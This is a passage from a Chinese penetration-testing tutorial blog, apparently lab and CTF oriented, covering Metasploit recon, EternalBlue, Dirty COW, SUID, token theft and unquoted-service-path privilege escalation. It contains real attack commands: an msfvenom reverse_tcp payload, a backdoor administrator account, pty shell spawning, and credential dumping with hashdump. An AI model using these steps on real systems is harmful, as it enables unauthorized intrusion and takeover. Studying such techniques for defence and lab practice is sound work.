href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a><br>在kali的msf中可以用自带的模块进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs msf">search suggester#直接使用MSF自带的exp模块进行提权<br></code></pre></td></tr></table></figure><h2 id="Linux-Suid提权"><a href="#Linux-Suid提权" class="headerlink" title="Linux Suid提权"></a>Linux Suid提权</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>suid：在Linux系统中，suid（set user ID upon execution）是一个特殊的权限位，它允许一个程序在执行时临时地以文件所有者的权限运行，而不是以执行该程序的用户权限运行。</p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io</a>   GTFOBins是 Unix 二进制文件的精选列表，可用于绕过配置错误的系统中的本地安全限制。</p><p>注意：<br>1.只有可以执行的二进制程序文件设定SUID权限才可利用,非二进制文件设置SUI权限没任何意义<br>2.命令执行者要对该程序文件拥有执行(x)权限<br>3.SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效</p><h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p>如何设置Suid:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> u+s filename <span class="hljs-comment">#设置suid</span><br><span class="hljs-built_in">chmod</span> u‐s filename <span class="hljs-comment">#取消suid</span><br></code></pre></td></tr></table></figure><p>查找具有Suid权限的文件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / ‐perm ‐u=s ‐<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br><span class="hljs-comment">#‐perm ‐u=s：查找具有suid权限的文件。</span><br><span class="hljs-comment">#‐type f：限制查找的类型为文件（不包括目录）。</span><br>find / ‐user root ‐perm ‐4000 ‐<span class="hljs-built_in">print</span> 2&gt;/dev/null <span class="hljs-comment">#查找属于Root用户的具有Suid权限的文件</span><br><span class="hljs-comment">#‐user root：查找属于root用户的文件。</span><br><span class="hljs-comment">#‐perm ‐4000：查找具有suid、sgid或sticky位的文件。</span><br></code></pre></td></tr></table></figure><p>Find命令实现Suid提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / ‐user root ‐perm ‐4000 ‐<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> ‐ldb &#123;&#125; \; <span class="hljs-comment">#Find可以用来执行系统命令如果为find添加上suid特殊权限位，即可实现提权。</span><br><span class="hljs-built_in">chmod</span> u+s /usr/bin/find <span class="hljs-comment">#加上权限</span><br><span class="hljs-built_in">ls</span> ‐al /usr/bin/find <span class="hljs-comment">#查看find命令的权限</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B8%97%E9%80%8F8.1.png" alt="图片" title="查看find命令的权限，x变成s则可以实现提权"><br>接下来给find命令权限（此处需要root才能，所以意义不大还是要拿到root）：<br><img src="/img/%E6%B8%97%E9%80%8F8.2.png" alt="图片" title="成功赋予find命令权限"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find google ‐<span class="hljs-built_in">exec</span> <span class="hljs-built_in">mkdir</span> /opt/test \; <span class="hljs-comment">#google可以是任何存在的文件，成功创建目录</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B8%97%E9%80%8F8.3.png" alt="图片" title="查看当前目录"></p><h2 id="Linux-Sudo提权"><a href="#Linux-Sudo提权" class="headerlink" title="Linux Sudo提权"></a>Linux Sudo提权</h2><p>由于root账户密码的敏感性和root账号的无限制权限,一般会通过useradd创建一些普通用户, 只让他们拥有不完全的权限; 如有必要，再来申请执行一些root权限的指令。</p><p>sudo命令的执行流程是: 当前用户转换到root, 然后以root身份执行命令, 执行完成后, 直接退回到当前用户。</p><p>注意: 执行sudo时输入的密码, 是当前用户的密码, 并非root密码。</p><p>ubuntu桌面版默认禁止root账号，自然也不会开启root账号的远程登录(ssh登录)。</p><p>如果需要切换到root账号, 可以使用命令sudo ‐i, 然后输入自己的用户密码来从而切换成root身份。但如果使用命令su ‐ root来切换root身份就行不通，因为你输入的密码压根就不是root的密码。当然，你可以通过<code>sudo passwd root</code>修改root用户的密码从而解锁root用户,但这种方式并不被推荐。</p><h2 id="Linux脏牛提权"><a href="#Linux脏牛提权" class="headerlink" title="Linux脏牛提权"></a>Linux脏牛提权</h2><p>脏牛漏洞(CVE‐2016–5195)，又叫Dirty COW，存在Linux内核中已经有长达9年<br>的时间，在2007年发布的Linux内核版本中就已经存在此漏洞，在2016年10月18后<br>才得以修复，因此影响范围很大。</p><p>漏洞具体是由于get_user_page内核函数在处理Copy‐on‐Write的过程中，可能<br>产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区<br>域的机会。</p><p>修改su或者passwd程序就可以达到root的目的。</p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>低权限用户利用脏牛漏洞可以在众多Linux系统上实现本地提权</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>内核版本低于以下版本也存在：<br>Centos7 &#x2F;RHEL7 3.10.0‐327.36.3.el7<br>Cetnos6&#x2F;RHEL6 2.6.32‐642.6.2.el6<br>Ubuntu 16.10 4.8.0‐26.28<br>Ubuntu 16.04 4.4.0‐45.66<br>Ubuntu 14.04 3.13.0‐100.147<br>Debian 8 3.16.36‐1+deb8u2<br>Debian 7 3.2.82‐1</p><h3 id="漏洞实操"><a href="#漏洞实操" class="headerlink" title="漏洞实操"></a>漏洞实操</h3><p>首先需要一个低版本的Ubuntu：<br><img src="/img/%E6%B8%97%E9%80%8F8.5.png" alt="图片" title="Ubuntu14.04"><br>首先在kali上面扫描网段里面存活的主机，这里发现192.168.56.137：<br><img src="/img/%E6%B8%97%E9%80%8F8.6.png" alt="图片" title="网段中存活的主机"><br>接下来扫描主机开启的服务，发现了三个端口，逐一查看：<br><img src="/img/%E6%B8%97%E9%80%8F8.7.png" alt="图片" title="注意设置端口的范围不然默认范围1-1000扫不到1898端口"><br>进入1898端口发现了可渗透界面：<br><img src="/img/%E6%B8%97%E9%80%8F8.8.png" alt="图片" title="发现了lampiao网站发现是Drupal建站的"><br>可以看到msf中已经有了很多的drupal漏洞：<br><img src="/img/%E6%B8%97%E9%80%8F8.9.png" alt="图片" title="msf搜索drupal"><br>利用msf进行攻击：<br><img src="/img/%E6%B8%97%E9%80%8F8.10.png" alt="图片" title="msf成功攻击"><br>首先下载好脏牛漏洞的exp：<br>Exp项目地址：</p><ul><li><a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a> 需要gcc编译，会自动创建一个具备Root权限的新用户firefart</li><li><a href="https://github.com/gbonacini/CVE%E2%80%902016%E2%80%905195">https://github.com/gbonacini/CVE‐2016‐5195</a> 需要make编译，会自动打开一个root shell</li></ul><p>这里利用upload上传exp到目标主机，然后利用python开启虚拟终端的环境：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span> <span class="hljs-comment">#pty是伪终端工具</span><br></code></pre></td></tr></table></figure><p>利用脏牛漏洞成功进入root：<br><img src="/img/%E6%B8%97%E9%80%8F8.11.png" alt="图片" title="成功进入root，cat即可拿到flag"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>msf</tag>
      
      <tag>UAC</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透（3）</title>
    <link href="/5/"/>
    <url>/5/</url>
    
    <content type="html"><![CDATA[<p>为了防止频繁的sudo su，这里给root改密码，方便之后用root登录进行操作：<br><img src="/img/%E6%B8%97%E9%80%8F5.1.png" alt="图片" title="修改root密码方便之后操作"><br>永恒之蓝需要用的kali中msf模块里的ms17-010，这里的1号exp会比0号exp适用的版本更老：<br><img src="/img/%E6%B8%97%E9%80%8F5.3.png" alt="图片" title="利用search命令查看ms17-010"></p><p>首先利用auxiliary进行漏洞的检测判断是否存在这个漏洞,auxiliary模块在<a href="https://zxl.world/2024/09/02/2/">第二节</a>中提到了：<br><img src="/img/%E6%B8%97%E9%80%8F5.2.png" alt="图片" title="测试目标主机是否存在此漏洞，发现存在"></p><p>这里选用0号exp成功进行拿到shell：<br><img src="/img/%E6%B8%97%E9%80%8F5.4.png" alt="图片" title="设置好rhosts后run成功拿到shell"></p><p>由于永恒之蓝是系统内核级的缓冲区溢出漏洞，所以能直接拿到目标主机的最高权限，这里使用hashdump进行查看目标主机的用户的密码，可以在<a href="cmd5.com">cmd5网站</a>解密后查看原文：</p><p><img src="/img/%E6%B8%97%E9%80%8F5.5.png" alt="图片" title="查看加密后的密码"></p><p>拿到了最高权限之后这里就能进行之前<a href="https://zxl.world/2024/09/05/4/">第四节</a>提到的msf后渗透环节的一系列操作此处不一一赘述</p><p>此时可以直接输入shell进入到目标主机的shell，不过会出现乱码：<br><img src="/img/%E6%B8%97%E9%80%8F5.6.png" alt="图片" title="进入目标主机的shell"></p><p>解决办法：直接输入<code>chcp 65001</code>，可以发现乱码没了：<br><img src="/img/%E6%B8%97%E9%80%8F5.7.png" alt="图片" title="还有一点乱码..."></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cmd">//创建新用户admin<br><span class="hljs-function">C:\<span class="hljs-title">Windows</span>\<span class="hljs-title">system32</span>&gt;<span class="hljs-title">net</span> <span class="hljs-title">user</span> <span class="hljs-title">admin</span> <span class="hljs-title">admin123</span> /<span class="hljs-title">add</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">The</span> <span class="hljs-title">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.</span><br><span class="hljs-function"> </span><br><span class="hljs-function">//将其添加进管理员组中</span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">system32</span>&gt;<span class="hljs-title">net</span> <span class="hljs-title">localgroup</span> <span class="hljs-title">administrators</span> <span class="hljs-title">admin</span> /<span class="hljs-title">add</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">The</span> <span class="hljs-title">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.</span><br></code></pre></td></tr></table></figure><p>可以看到永恒之蓝漏洞可以拿到最高权限，而之前提到的文件上传漏洞拿到的只是普通用户权限，最直观的感受就是普通用户不能通过<code>hashdump</code>获取目标主机的密码，这里就涉及到了提权，假设目标主机不存在永恒之蓝漏洞仅可以通过文件上传漏洞进行攻击，想看如何提权，请前往下一节。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过上一节可以看到永恒之蓝漏洞可以拿到最高权限，而之前提到的文件上传漏洞拿到的只是普通用户权限，最直观的感受就是普通用户不能通过<code>hashdump</code>获取目标主机的密码，这里就涉及到了提权。</p><h2 id="权限概述"><a href="#权限概述" class="headerlink" title="权限概述"></a>权限概述</h2><p>Windows计算机中常见的权限：</p><ul><li>用户权限（Users）</li><li>管理员权限（Administrators）</li><li>系统权限 (SYSTEM)</li><li>访客权限 (Guest)</li></ul><p>Windows提权路径:</p><ul><li>user ‐‐&gt; administrator</li><li>administrator ‐‐&gt; system</li><li>services ‐‐&gt; system</li></ul><p>Linux提权路径：</p><ul><li>user ‐‐‐&gt; root</li></ul><h2 id="提权分类"><a href="#提权分类" class="headerlink" title="提权分类"></a>提权分类</h2><h3 id="操作系统提权"><a href="#操作系统提权" class="headerlink" title="操作系统提权"></a>操作系统提权</h3><p>Windows：MS06-067、MS10-084、MS11-014、MS11-05、MS12-020、MS16032 等<br>Linux：CVE-2017-7308、CVE-2017-6074、CVE-2017-5123、CVE-2016-9793、CVE-2016-5195 等</p><h3 id="应用程序提权"><a href="#应用程序提权" class="headerlink" title="应用程序提权"></a>应用程序提权</h3><p>SQL Server、MySQL、Oracle 等</p><h2 id="提权方法"><a href="#提权方法" class="headerlink" title="提权方法"></a>提权方法</h2><p>本地提权漏洞是指一个本来权限非常低、操作受限制的用户，通过某种条件（例如，通过应用程序漏洞或者系统漏洞）直接提升到系统最高权限。</p><p>远程提权是指黑客或者攻击者通过漏洞利用程序，直接获取远程服务器的权限（在远程服务器上必须存在漏洞且未修补或者修补未成功）。</p><h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><p>1 拥有Webshell&#x2F;Beacon&#x2F;Sessions<br>2 拥有普通用户权限<br>3 拥有某些软件的账号密码<br>4 本地或远程服务器上存在漏洞<br>5 拥有漏洞利用工具代码</p><h2 id="Windows内核漏洞提权"><a href="#Windows内核漏洞提权" class="headerlink" title="Windows内核漏洞提权"></a>Windows内核漏洞提权</h2><p>1 <a href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a> &#x2F;&#x2F;包含大量的Windows系统提权Exp<br>2 <a href="https://github.com/SecWiki/windows%E2%80%90kernel%E2%80%90exploits">https://github.com/SecWiki/windows‐kernel‐exploits</a> &#x2F;&#x2F;另一个包含有大量Windows提权Exp的集合（更新到2018年）<br>3 <a href="https://msrc.microsoft.com/update%E2%80%90guide/zh%E2%80%90cn">https://msrc.microsoft.com/update‐guide/zh‐cn</a> &#x2F;&#x2F;微软应急响应中心发布的漏洞信息集合<br>4 <a href="https://github.com/chroblert/WindowsVulnScan/tree/master">https://github.com/chroblert/WindowsVulnScan/tree/master</a> &#x2F;&#x2F;依据当前主机的补丁信息来收集漏洞信息</p><h2 id="Windows内核漏洞提权-1"><a href="#Windows内核漏洞提权-1" class="headerlink" title="Windows内核漏洞提权"></a>Windows内核漏洞提权</h2><h3 id="CVE-2020-0787"><a href="#CVE-2020-0787" class="headerlink" title="CVE-2020-0787"></a>CVE-2020-0787</h3><p>这应该是windows系统最方便的提权CVE，直接下载exe文件上传到目标主机后执行即可拿到system权限：地址：<a href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases</a><br>直接在目标主机运行即可从普通用户提升到system权限，不过system的shell会在目标主机桌面上弹出不会在远程主机上，这里需要再用远程桌面进行操作：<br><img src="/img/%E6%B8%97%E9%80%8F6.1.png" alt="图片" title="直接拿到了系统权限"></p><h3 id="令牌提权"><a href="#令牌提权" class="headerlink" title="令牌提权"></a>令牌提权</h3><p>令牌窃取（Token Theft）是一种Windows上常用的提权攻击技术，攻击者可以通过获取系统中一个高权限进程的安全令牌，然后将其注入到一个低权限进程中，使得低权限进程可以获得高权限进程的访问权限。</p><p>令牌分类：</p><blockquote><p>访问令牌(Access Token)：表示访问控制操作主体的系统对象；<br>会话令牌(Session Token)：是交互会话中唯一的身份标识符；<br>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾等。</p></blockquote><p>访问令牌（access token）:令牌所包含的信息是与该user账户相关的进程或线程的身份和权限信息。当user登录时，系统通过将user输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统此时会为user生成一个访问令牌,Windows的访问令牌（AccessToken）有两种类型：</p><blockquote><p>Delegation token(授权令牌)：用于交互会话登录(例如本地用户直接登录、远程桌面登录)<br>Impersonation token(模拟令牌)：用于非交互登录(利用net use访问共享文件夹)</p></blockquote><p>令牌窃取主要用模拟令牌，通过incognito.exe工具能够获取到已注销用户的token,这里可以利用一个叫烂土豆的漏洞，对应的是MS16‐075漏洞，是本地提权的漏洞，仅针对本地用户，支持将用户权限从administrator提权到system，不能用于域用户。</p><blockquote><p><a href="https://github.com/SecWiki/windows%E2%80%90kernel%E2%80%90exploits/tree/master/MS16%E2%80%90075">https://github.com/SecWiki/windows‐kernel‐exploits/tree/master/MS16‐075</a></p></blockquote><p>利用方法：<br>1、先拿到<strong>administrator权限</strong>的shell</p><p>meterpreter &gt; getprivs 查看是否具有 <strong>SeImpersonate</strong> 权限(普通用户一般不具有<br>或者服务器的cmd下键入以下命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">whoami /all<br>whoami /priv<br></code></pre></td></tr></table></figure><p>2、执行烂土豆，模仿安全令牌拿到system权限</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> incognito 加载工具集<br>list_tokens ‐u 列出用户级别的令牌<br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\\SYSTEM&quot;</span> 模拟Windows系统中的SYSTEM账户的访问令牌<br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B8%97%E9%80%8F6.2.png" alt="图片" title="成功拿到了系统权限"></p><h2 id="Windows系统错误配置漏洞-可信任服务路径漏洞"><a href="#Windows系统错误配置漏洞-可信任服务路径漏洞" class="headerlink" title="Windows系统错误配置漏洞-可信任服务路径漏洞"></a>Windows系统错误配置漏洞-可信任服务路径漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Trusted Service Paths 漏洞是由系统中的“CreateProcess”函数引起的，并利用了windows文件<br>路径解析的特性。该漏洞是由于一个服务的可执行文件没有正确的处理所引用的完整路径名，即一个服务的可执行文件的完整路径中含有空格且没有被双引号引起来，那么该服务就存在这个漏洞。</p><p>Windows中文件路径解析的特性<br>例如，有一个文件路径为“C:\Program Files\Some Folder\Service.exe”。那么，对于该路径中<br>的每一个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序。<br>如上面的目录为例，Windows会依次尝试确定和执行以下程序：</p><p>C:\Program.exe<br>C:\Program Files\Some.exe<br>C:\Program Files\Some Folder\Service.exe</p><p>可见，最后才确定并执行真正的程序Service.exe。而由于Windows服务通常是以system权限运行的，所以系统在解析服务文件路径中的空格时，也会以system系统权限进行，那么，如果将一个“适当命名”的可执行程序上传到以上所说的受影响的目录中，服务一旦启动或重启，该程序就会以system权限运行了，可见该漏洞利用了服务路径的文件&#x2F;文件夹的权限。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="1、检测目标主机是否存在该漏洞"><a href="#1、检测目标主机是否存在该漏洞" class="headerlink" title="1、检测目标主机是否存在该漏洞"></a>1、检测目标主机是否存在该漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode|findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows&quot;</span> |findstr/i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">#检测是否有自启动并且在服务路径中有空格的服务</span><br></code></pre></td></tr></table></figure><h4 id="2、检测对目录程序目录是否有写入权限"><a href="#2、检测对目录程序目录是否有写入权限" class="headerlink" title="2、检测对目录程序目录是否有写入权限"></a>2、检测对目录程序目录是否有写入权限</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls <span class="hljs-string">&quot;C:\Program Files (x86)\&quot;</span><br><span class="hljs-string">#显示F为完全控制</span><br></code></pre></td></tr></table></figure><h4 id="3、生成Payload"><a href="#3、生成Payload" class="headerlink" title="3、生成Payload"></a>3、生成Payload</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom ‐p windows/meterpreter/reverse_tcp LHOST=主机ip LPORT=主机端口 ‐f exe ‐o Advanced.exe<br></code></pre></td></tr></table></figure><h4 id="4、上传Payload"><a href="#4、上传Payload" class="headerlink" title="4、上传Payload"></a>4、上传Payload</h4><p>将Payload放置在C:\Program Files (x86)\目录下<br><img src="/img/%E6%B8%97%E9%80%8F6.3.png" alt="图片" title="成功上次到目标主机"></p><h4 id="5、监听主机端口，"><a href="#5、监听主机端口，" class="headerlink" title="5、监听主机端口，"></a>5、监听主机端口，</h4><p><img src="/img/%E6%B8%97%E9%80%8F6.5.png" alt="图片" title="查看该服务类型，发现是自启动服务"><br>在攻击侧监听主机端口，等待目标主机重启后自动建立shell连接<br><img src="/img/%E6%B8%97%E9%80%8F6.4.png" alt="图片" title="由于该服务是自启动服务，重启后成功上线目标主机"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>msf</tag>
      
      <tag>ms17-010</tag>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透（2）</title>
    <link href="/3/"/>
    <url>/3/</url>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>首先要知道有什么主机才能进行接下来的操作</p><p>arp_sweep：使用arp请求枚举本地局域网中的所有活跃主机，arp的扫描能力还行，<strong>丢失信息较少</strong>。<br>udp_sweep：通过发送UDP数据包探查指定主机是否活跃，并发现主机上udp服务，<strong>丢失信息较多</strong>。</p><p>show missing 查看模块命令的必填项</p><p>show options 查看目前的配置项</p><p>set是局部配置只在当前模块下运行，setg是全局配置。</p><p>自己开三台虚拟机试一下就知道咯<br><img src="/img/%E6%B8%97%E9%80%8F3.1.png" alt="图片" title="arp扫描的结果，扫描到了部分的主机"><br><img src="/img/%E6%B8%97%E9%80%8F3.2.png" alt="图片" title="udp扫描的结果，什么都没扫描到不愧是udp"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>知道了有哪些主机之后就看主机的端口有哪些</p><p>search portscan分为三类，<strong>SYN</strong>用的最多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">//使用发送TCP SYN标志的方式探测开放端口<br>auxiliary/scanner/protscan/syn<br>//通过一次完整的TCP连接来判断端口是否开放 最准确但是最慢<br>auxiliary/scanner/protscan/tcp<br>//一种更为隐秘的扫描方式，通过发送FIN，PSH，URG标志，能够躲避一些高级的TCP标记检器的过滤<br>auxiliary/scanner/protscan/xmas<br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B8%97%E9%80%8F3.3.png" alt="图片" title="TCP端口扫描的配置，默认是扫描到10000端口"><br><img src="/img/%E6%B8%97%E9%80%8F3.4.png" alt="图片" title="TCP端口扫描的结果"></p><h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h3><p>确定开放端口后，对相应端口上所运行的服务信息进行挖掘</p><h4 id="利用SMB进行挖掘"><a href="#利用SMB进行挖掘" class="headerlink" title="利用SMB进行挖掘"></a>利用SMB进行挖掘</h4><p>首先枚举暴力破解账号密码：<br><img src="/img/%E6%B8%97%E9%80%8F3.5.png" alt="图片" title="成功爆破得到账号密码"><br>然后利用SMB获得目标主机的开启服务：<br><img src="/img/%E6%B8%97%E9%80%8F3.6.png" alt="图片" title="成功得到开启服务"></p><h4 id="利用telnet服务进行挖掘"><a href="#利用telnet服务进行挖掘" class="headerlink" title="利用telnet服务进行挖掘"></a>利用telnet服务进行挖掘</h4><p>首先需要目标主机开启了telent服务：<br><img src="/img/%E6%B8%97%E9%80%8F3.7.png" alt="图片" title="开启telent服务"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>知道了主机开启的端口和服务后可以进行漏洞的利用，所有的漏洞利用模块都在：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/share/metasploit‐framework/modules/exploits<br></code></pre></td></tr></table></figure><p>在漏洞成功利用后，会与目标系统建立一个shell会话，此时就需要使用meterpreter进行后渗透 </p><h4 id="Payload的类型"><a href="#Payload的类型" class="headerlink" title="Payload的类型"></a>Payload的类型</h4><h5 id="singles"><a href="#singles" class="headerlink" title="singles"></a>singles</h5><p>是一种完全独立的payload，而且使用起来就像运行calc.exe一样简单，如：windows&#x2F;powershell_bind_tcp 就是一个 Single 类型的 payload，它使用 PowerShell 在目标系统上创建一个 TCP 服务，并监听一个端口，任何可以连接到该服务的客户端都可以与目标系统建立一个shell连接。</p><h5 id="stagers"><a href="#stagers" class="headerlink" title="stagers"></a>stagers</h5><p>传输器载荷，用于目标机与攻击机之间建立稳定的网络连接，与传输体载荷配合攻击。通常该载荷体积都非常小，可以在漏洞利用后方便注入，这类载荷功能都非常相似，大致分为bind（正向）型和reverse（反向）型，bind型是需要攻击机主动连接目标端口的；而reverse型是目标机反连接攻击机，需要提前设定好连接攻击机的ip地址和端口号。</p><p>这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。</p><p>一种常见的Stager Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接，让目标系统主动连接我们的端口(反向连接)。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)。</p><h5 id="stages"><a href="#stages" class="headerlink" title="stages"></a>stages</h5><p>传输体载荷，在stagers建立好稳定的连接后，攻击机将stages传输给目标机，由stagers进行相应处理，将控制权转交给stages。比如得到目标机的shell，或者meterpreter控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。 如：meterpreter</p><p>stager和stage就像web入侵里面提到的小马和大马一样，由于exploit环境的限制，不能一下子把stage传过去，需要先传一个stager，stager在attacker和target之间建立网络连接，之后再把stage传过去进行下一步的行动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#Single Payload的格式为：</span><br>&lt;target&gt;/ &lt;single&gt; 如：windows/powershell_bind_tcp<br><span class="hljs-comment">#Stager/Stage Payload的格式为：</span><br>&lt;target&gt;/ &lt;stage&gt; / &lt;stager&gt; 如：windows/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p>Payload通常是结合exp来使用的</p><h5 id="常见的stager"><a href="#常见的stager" class="headerlink" title="常见的stager"></a>常见的stager</h5><h6 id="reverse-tcp"><a href="#reverse-tcp" class="headerlink" title="reverse_tcp"></a>reverse_tcp</h6><p>基于TCP的反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">linux/x86/meterpreter/reverse_tcp<br>windows/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><h6 id="reverse-http"><a href="#reverse-http" class="headerlink" title="reverse_http"></a>reverse_http</h6><p>基于http方式的反向连接，在网速慢的情况下不稳定。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">windows/meterpreter/reverse_https<br></code></pre></td></tr></table></figure><h6 id="bind-tcp"><a href="#bind-tcp" class="headerlink" title="bind_tcp"></a>bind_tcp</h6><p>基于TCP的正向连接shell，因为在内网跨网段时无法连接到攻击者的机器，所以在内网中经常会使用，不需要设置LHOST。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">linux/x86/meterpreter/bind_tcp<br>windows/meterpreter/bind_tcp<br></code></pre></td></tr></table></figure><h5 id="Payload的生成"><a href="#Payload的生成" class="headerlink" title="Payload的生成"></a>Payload的生成</h5><p>msfvenom — Metasploit 独立有效负载生成器，是用来生成后门的软件，在目标机上执行后门上线。<br>msfvenom提供了各种不同类型的有效载荷（payloads），其中涵盖了多个操作系统和使用环境，例如Android、IOS、Unix、Linux、Windows…等，用于在渗透测试和漏洞评估中利用系统漏洞、获取对目标系统的控制或执行特定的操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom ‐h <span class="hljs-comment">#可查看帮助信息</span><br>‐p：–payload，指定特定的 Payload，如果被设置为‐，那么从标准输入流中读取。几乎支持全平台。 